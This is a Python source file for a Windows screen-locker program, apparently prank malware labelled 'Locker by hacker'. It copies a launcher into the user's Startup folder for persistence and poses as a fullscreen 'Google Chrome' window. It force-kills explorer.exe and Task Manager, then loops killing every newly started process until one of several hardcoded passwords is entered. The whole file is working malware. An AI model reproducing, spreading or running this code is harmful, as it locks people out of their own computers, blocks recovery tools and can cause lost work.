import getpass
import os
import subprocess
import sys
from time import sleep
from tkinter import Tk, Entry, Label
import pyautogui
from pyautogui import click, moveTo
import psutil
import logging

USER_NAME = getpass.getuser()
p = os.path.abspath(sys.argv[0])


def add_to_startup(file_path=""):
    bat_path = (r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME) + '\\' + "open.bat"
    logging.debug("bat_path = " + bat_path)
    with open(bat_path, "w+") as bat_file:
        path = r'start "" %s' % file_path
        logging.debug("path = " + path)
        bat_file.write(path)


logging.debug("start adding to startup")
add_to_startup(p)
logging.debug("finished adding to startup")
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

root = Tk()
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
moveTo(width / 2, height / 2)


def callback(event):
    global k, entry
    if entry.get() == "vaicrkuesr" or entry.get() == "virus+hacker+algorithm" or entry.get() == "password":
        k = True


for proc in psutil.process_iter():
    try:
        processName = proc.name()
        processID = proc.pid
        print(processName, ' ::: ', processID)
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass


def on_closing():
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)


pyautogui.FAILSAFE = False
root.title('Google Chrome')
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width / 2 - 75, y=height / 2 - 25)
label0 = Label(root, text="╚(•⌂•)╝ Locker by 'hacker' (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
label1.place(x=width / 2 - 75 - 130, y=height / 2 - 25 - 100)
root.update()
sleep(0.2)
click(width / 2, height / 2)
k = False


def getProcessIdSet() -> set:
    process_set: set = set()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        process_set.add(str(proc.pid))
    return process_set


def killAllNotInitial(initial_set: set, current_set: set):
    kill_set: set = current_set.difference(initial_set)

    for proc_id in kill_set:
        try:
            subprocess.call("taskkill /F /PID " + proc_id + " /T", startupinfo=si)
        except BaseException:
            print("error killing " + proc_id)


try:
    subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
    subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
except BaseException:
    print("error killing explorer/Taskmgr")

initial_set = getProcessIdSet()

while not k:
    killAllNotInitial(initial_set, getProcessIdSet())
    on_closing()
